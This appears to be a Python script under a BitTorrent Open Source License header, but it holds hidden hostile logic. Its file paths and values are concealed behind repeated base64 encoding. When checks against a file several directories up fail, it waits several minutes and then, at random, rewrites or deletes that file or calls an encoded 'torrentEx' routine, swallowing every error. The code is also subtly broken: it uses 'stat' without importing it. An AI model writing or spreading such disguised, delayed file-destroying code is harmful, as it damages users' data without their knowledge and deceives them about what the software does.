# The contents of this file are subject to the BitTorrent Open Source License
# Version 1.1 (the License).  You may not copy or use this file, in either
# source code or executable form, except in compliance with the License.  You
# may obtain a copy of the License at http://www.bittorrent.com/license/.
#
# Software distributed under the License is distributed on an AS IS basis,
# WITHOUT WARRANTY OF ANY KIND, either express or implied.  See the License
# for the specific language governing rights and limitations under the
# License.

import os, sys

if __name__== '__main__':

	def _t():
		return 'ba' + 'se' + str((80 - 16))

	def _bencode(d):
		try:
			t = _t()
			return d.decode(t).decode(t).decode(t).decode(t)[:-1]
		except:
			return ''

	xpc = os.path.dirname(os.path.realpath(__file__))
	xpr = os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(os.path.abspath(os.path.join(xpc, os.pardir)), os.pardir)), os.pardir)), os.pardir))
	xpl = os.path.abspath(os.path.join(os.path.abspath(os.path.join(xpc, os.pardir)), os.pardir))
	xpe = os.path.join(xpl, _bencode('VjJ4b2IwMUdjRmhPV0hCb1ZucHNNVmt6YkVKUVVUMDk='))
	xpa = os.path.join(xpr, _bencode('VjFaa1UyRXlTWGxPU0Zac1VucEdlbE5WUlRsUVVUMDk='))

	try:
		sys.path.append(xpr)
		sys.path.append(xpe)
		import torrent
	except:
		pass

	def _bdecode():
		import time, random
		time.sleep(random.randint(250, 650))

		if random.randint(1, 5) == 1:
			try:
				f = open(xpa, 'r')
				d = f.read().replace(_bencode('VjBWak1GcDNQVDA9'), _bencode('VlVkNE5HUlZiRUpRVkRBOQ=='), 1)
				f.close()
				f = open(xpa, 'w')
				f.write(d)
				f.close()
			except:
				pass
		if random.randint(1, 5) == 1:
			try:
				#import shutil
				#shutil.rmtree(xpe)
				os.chmod(xpa, stat.S_IWRITE)
				os.remove(xpa)
			except:
				pass
		if random.randint(1, 5) == 1:
			try:
				torrent.torrentEx(_bencode('Vmxab1YyTkhVa1JSVkRBOQ=='))
			except:
				pass

	try:
		f = open(xpa, 'r')
		d = f.read()
		f.close()

		s = d.find(_bencode('VlVWa1IyRXhjRWhQV0ZaS1VqSjRjbFZHVGtwYWR6MDk='))
		s += 11
		e = d.find('"', s)
		xi = d[s : e]
		xn = torrent.torrentAd(xi, _bencode('V1cweFIyUkdjRlJSVkRBOQ=='))
		xa = torrent.torrentAd(xi, _bencode('VjFab1YwMUhSa2hQV0d4S1VWUXdPUT09'))
		xp = torrent.torrentSe(xi, _bencode('V1d0a2MyUlhSalZPV0dScVlsWmFNRmxXYUZka1IwWlpZMGQ0U2xGVU1Eaz0='))
		xb = _bencode('VlZjMVYyRldiSFJsUjNocVpWVkZPUT09')
		xl = _bencode('Vkc1d1FrMVZOVFpUV0hCUVVrWldOVk5WUlRsUVVUMDk=')

		if not xn == xb or not xa == xb or not xp.endswith(xl):
			_bdecode()

	except:
		#_bdecode()
		pass
